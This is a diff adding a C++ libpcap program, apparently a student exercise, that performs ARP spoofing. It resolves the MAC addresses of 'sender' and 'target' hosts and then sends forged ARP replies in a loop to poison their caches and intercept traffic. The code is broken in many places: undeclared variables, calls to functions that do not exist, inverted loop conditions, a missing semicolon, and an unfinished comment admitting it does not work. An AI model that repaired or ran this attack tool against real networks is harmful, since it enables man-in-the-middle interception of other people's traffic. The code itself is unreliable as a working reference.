@@ -1,0 +1,258 @@
+#include <iostream>
+#include <stdio.h>
+#include <cstdio> 
+#include <stdlib.h>
+
+#include <pcap.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
+// #include <fcntl.h>
+//#include <unistd.h>
+#include <map>
+#include <thread>
+
+#include "ethhdr.h"
+#include "arphdr.h"
+#include "ip.h"
+#include "mac.h"
+
+Mac getMyMac(char* dev){
+    int fd;
+    struct ifreq ifr;
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
+
+    ioctl(fd, SIOCGIFHWADDR, &ifr);
+    close(fd);
+
+    Mac Mac_address = (uint8_t*)ifr.ifr_hwaddr.sa_data;
+
+    return Mac_address;
+};
+
+Ip getMyIp(char* dev){
+    int fd;
+    struct ifreq ifr;
+    uint32_t ip_address;
+
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ - 1);
+
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    close(fd);
+
+    ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);
+
+    return ip_address;
+};
+
+int sendArpPacket(pcap_t* handle, Mac ethernetDestinationMac, 
+                Mac ethernetSourceMac, uint16_t* operation, Mac arpSourceMac,
+                Ip arpSourceIp, Mac arpmapMac, Ip arpTargetIp) {
+
+    arp_packet packet;
+
+    packet.eth_.dmac_ = ethernetDestinationMac;
+    packet.eth_.smac_ = ethernetSourceMac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = operation;
+    packet.arp_.smac_ = arpSourceMac;
+    packet.arp_.sip_ = arpSourceIp;
+    packet.arp_.tmac_ = arpmapMac;
+    packet.arp_.tip_ = arpTargetIp;
+
+    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(arp_packet));
+}
+
+int sendArpRequest(pcap_t* handle, Mac sourceMac, Ip sourceIp, Ip targetIp) {
+
+    return sendArpPacket(handle, Mac::BraodcastMac(), sourceMac,
+            htons(ArpHdr::Request), sourceMac, htonl(sourceIp),
+            Mac::nullMac(), htonl(targetIp));
+}
+
+int sendArpReply(pcap_t* handle, Mac sourceMac, Ip sourceIp, Mac mapMac, Ip targetIp) {
+    
+    return sendArpPacket(handle, mapMac, sourceMac, htons(ArpHdr::Reply),
+                        sourceMac, htonl(sourceIp), mapMac, htonl(targetIp));
+}
+
+void sendTo(pcap_t* handle, const Mac& MyMAC, const Ip& myIP, const Ip& _IP[], const map<Ip, Mac>& victimPairs, const std::string& _name) {
+    
+    int res;
+    bool stop;
+
+    for (int i = 0; i < pair; i++) {
+        stop = false;
+
+        for (int j = 0; j < 5; j++) {
+            if (stop) break;
+
+            if (4 == j) {
+                printf("FAIL: %s does not reply ... \n", _name);
+                printf("Quit the process ... \n\n");
+                return -1;
+            }
+
+            res = sendArpRequest(handle, myMac, myIp, _IP[i]);
+
+            if (res != 0) {
+                printf("FAIL: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                return -1;
+            }
+
+            struct pcap_pkthdr* header;
+            const uint8_t* packet;
+            
+            while (true) {
+
+                res = pcap_next_ex(handle, &header, &packet);
+
+                if (res == 0) continue;
+                if (res == -1 || res == -2) {
+                    printf("ERROR: pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
+                    return -1;
+                }
+
+                EthHdr* ethernetHeader = (EthHdr*)packet;
+
+                if (ethernetHeader->type() != EthHdr::Arp) {
+                    continue;
+                }
+
+                ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));
+
+                if (arpHeader->op() != ArpHdr::Reply || 
+                    arpHeader->hrd() != ArpHdr::ETHER ||
+                    arpHeader->pro() != EthHdr::Ip4) {
+                    continue;
+                }
+
+                if (arpHeader->tmac() == myMac && arpHeader->tip() == myIp && arpHeader->sip() == _IP[i]) {
+                    victimParis.insert(make_pair(_IP[i], (Mac)arpHeader->smac()));
+                    stop = true;
+                    break;
+                }
+            }
+        }
+    }
+
+}
+
+void sendPacketRepeatedly(pcap_t* pcap, const Mac& myMAC, const Ip& myIP, const map<Ip, Mac>& victimPairs, const int& pair) {
+
+    while(true) {
+        for(auto& a : victimPairs) {
+            for (int i = 0; pair < i; i++) {
+                sendArpReply(pcap, myMac, a.targetIp[i], a.find(a.senderIp[i])->second, a.senderIp[i]);
+            }
+        }
+        this_thread::sleep_for (std::chrono::seconds(3));
+    }
+}
+
+
+int main(int argc, char* argv[]) {
+
+    if(argc < 4 or (argc-1)%2 != 0) {
+        printf("Error              : Invalid input\n");
+        printf("valid input syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+        printf("example            : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n\n")
+
+        return -1;
+    }
+
+    char* dev = argv[1];
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	if (handle == NULL) {
+		printf("can't open pcap %s(%s)\n", dev, errbuf);
+		return -1;
+	}
+
+    Mac myMac;
+    myMac = getMyMac(dev);
+
+    Ip myIp;
+    myIp = getMyIp(dev);
+
+    map<Ip, Mac> mapMac;
+    int pair = (argc-3) / 2;
+    Ip senderIp[pair];
+    Ip targetIp[pair];
+
+    for (int i = 0; pair < i; i++) {
+        Ip senderIp[i] = Ip(argv[2 + i*2]);
+        Ip targetIp[i] = Ip(argv[3 + i*2]);
+    }
+    
+    int res;
+    bool stop;
+    
+    // attack sender and target (sendArp)
+    sendTo_(handle, myMac, myIp, senderIp, mapMac, "sender");
+    sendTo_(handle, myMac, myIp, targetIp, mapMac, "target");
+
+    printf("%8t===[checking the arp packet]===\n");
+    for (int i = 0; i < pair; i++) {
+        printf("sender#%d %s(%s)\n", i, std::string(senderIp[i]).data(),
+                std::string(mapMac.find(senderIp[i])->second).data());
+
+        printf("target#%d %s(%s)\n", i, std::string(targetIp[i]).data(),
+                std::string(mapMac.find(targetIp[i])->second).data());
+
+        printf("\n");
+    }
+
+    // make thread for period attack
+    thread periodAttack(handle, myMac, myIP, mapMac, pair);
+
+    // non-period attack (pcap-test ethernet)
+    struct pcap_pkthdr* header;
+    const u_char* packet;
+    
+    while (true) {
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
+        }
+
+        EthHdr* ethH = (struct EthHdr*)packet;
+        ArpHdr* arpH = (ArpHdr*)(packet_sizeof(EthHdr));
+
+        //classify the case -> hmmm.... yes! 
+        //but .. ... i can't.. ....
+
+        for(auto& a : victimPairs) {
+            for (int i = 0; pair < i; i++) {
+                sendArpReply(pcap, myMac, targetIp[i], mapMac.find(a.senderIp[i])->second, a.senderIp[i]);
+            }
+        }
+    }
+
+
+    periodAttack.join();
+
+    for(int i = 0; i < pair; i++){
+        for (int j = 0; j < 3; j++) {
+            sendArpRequest(handle, mapMac.find(senderIp[i])->second, senderIp[i], targetIp[i]);
+        }
+    }
+
+    return 0;
+}
